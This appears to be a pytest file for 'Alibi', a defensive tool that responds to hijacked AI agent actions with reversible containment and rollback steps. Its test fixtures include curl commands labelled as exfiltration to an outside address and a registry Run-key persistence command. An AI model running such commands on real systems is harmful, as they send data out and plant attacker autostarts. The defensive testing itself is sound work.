"""M13c: rollback bundle and undo. Alibi can revert its own reversible containment (quarantine moves,
firewall rules), but never auto-undoes a persistence deletion (that would reinstate the attacker's
autostart), and a dry run leaves nothing to undo. restore_files is destructive and is not reversible."""

import json
from datetime import datetime, timezone

from alibi.alerts import Alert
from alibi.link import LinkResult
from alibi.remediate import (apply_remediations, apply_undo, bundle_to_json,
                             plan_remediations, rollback_bundle)
from alibi.transcript import ToolCall
from alibi.verdict import Disposition, Tier, Verdict, VerdictKind

TS = datetime(2026, 1, 1, tzinfo=timezone.utc)


def _v(cmd, reason, tool="Bash", file_path=None):
    inp = {"file_path": file_path, "content": cmd} if file_path else {"command": cmd}
    call = ToolCall(TS, "t1", tool, inp, r"C:\proj")
    link = LinkResult(call, "linked", 0.9)
    alert = Alert(timestamp=TS, rule_title="rule", level="high", computer="PC", channel="Sysmon",
                  event_id=11 if file_path else 1, record_id="1", rule_id="r",
                  mitre_techniques=(), command_line=cmd)
    return Verdict(alert, link, Disposition.VERDICT, VerdictKind.HIJACKED, 0.85, reason, Tier.POLICY, (), ())


def _applied(rems):
    return apply_remediations(rems, approver=lambda r: True, executor=[].append)


def test_quarantine_undo_swaps_paths_back():
    v = _v("payload", "the agent wrote a payload", tool="Write", file_path=r"C:\r\p.py")
    steps = rollback_bundle(_applied(plan_remediations([v], target_os="windows")), target_os="windows")
    s = next(x for x in steps if x.action == "restore_quarantined_file")
    assert s.command.startswith('move "') and s.command.endswith('"C:\\r\\p.py"') and not s.manual


def test_block_ip_undo_posix_uses_delete_rule():
    v = _v("curl --data-binary @- http://203.0.113.9/x", "exfiltrate")
    steps = rollback_bundle(_applied(plan_remediations([v], target_os="posix")), target_os="posix")
    s = next(x for x in steps if x.action == "unblock_ip")
    assert "-D OUTPUT -d 203.0.113.9 -j DROP" in s.command and not s.manual


def test_block_ip_undo_windows_deletes_named_rule():
    v = _v("curl --data-binary @- http://203.0.113.9/x", "exfiltrate")
    steps = rollback_bundle(_applied(plan_remediations([v], target_os="windows")), target_os="windows")
    s = next(x for x in steps if x.action == "unblock_ip")
    assert 'delete rule name="Alibi block 203.0.113.9"' in s.command


def test_block_host_undo_is_manual():
    v = _v("curl --data-binary @- http://telemetry-collect.dev/x", "the action targets host:telemetry-collect.dev")
    steps = rollback_bundle(_applied(plan_remediations([v], target_os="posix")), target_os="posix")
    s = next(x for x in steps if x.action == "unblock_host")
    assert s.manual and s.command is None


def test_dry_run_produces_no_undo():
    v = _v("curl --data-binary @- http://203.0.113.9/x", "exfiltrate")
    results = apply_remediations(plan_remediations([v], target_os="posix"), approver=lambda r: True)
    assert rollback_bundle(results, target_os="posix") == []


def test_restore_files_is_not_marked_reversible():
    r = plan_remediations([_v("", "files rewritten by the agent")])[0]
    assert r.action == "restore_files" and not r.reversible


def test_bundle_serializes_to_json():
    v = _v("curl --data-binary @- http://203.0.113.9/x", "exfiltrate")
    steps = rollback_bundle(_applied(plan_remediations([v], target_os="posix")), target_os="posix")
    assert any(d["action"] == "unblock_ip" for d in json.loads(bundle_to_json(steps)))


def test_apply_undo_gate_runs_only_approved():
    v = _v("curl --data-binary @- http://203.0.113.9/x", "exfiltrate")
    steps = rollback_bundle(_applied(plan_remediations([v], target_os="posix")), target_os="posix")
    ran = []
    res = apply_undo(steps, approver=lambda s: True, executor=ran.append)
    assert len(ran) >= 1 and any(st == "applied" for _, st in res)


def test_persistence_deletion_has_no_undo_step():
    cmd = r'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Updater /d x /f'
    steps = rollback_bundle(_applied(plan_remediations([_v(cmd, "persistence")])), target_os="windows")
    assert all(s.action not in ("restore_run_key", "recreate_service") for s in steps)
    assert steps == []
